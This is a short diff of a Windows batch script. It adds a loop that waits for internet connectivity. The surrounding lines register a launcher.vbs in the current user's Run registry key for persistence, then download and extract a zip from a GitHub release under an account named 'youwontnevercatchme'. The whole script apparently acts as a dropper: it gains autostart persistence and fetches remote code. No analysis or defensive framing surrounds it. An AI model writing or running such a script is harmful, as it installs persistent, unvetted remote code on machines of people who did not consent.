@@ -1,3 +1,16 @@
+@echo off
+:check
+ping -n 1 www.google.com >nul 2>&1
+if errorlevel 1 (
+    timeout /t 5 >nul
+    goto check
+)
+goto end
+
+:end
+
+
+
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Launcher /t REG_SZ /d "%cd%\launcher.vbs" /f
 curl -L -o "ch3.zip" "https://github.com/youwontnevercatchme/files/releases/download/haha/ch3.zip"
 tar -xf ch3.zip
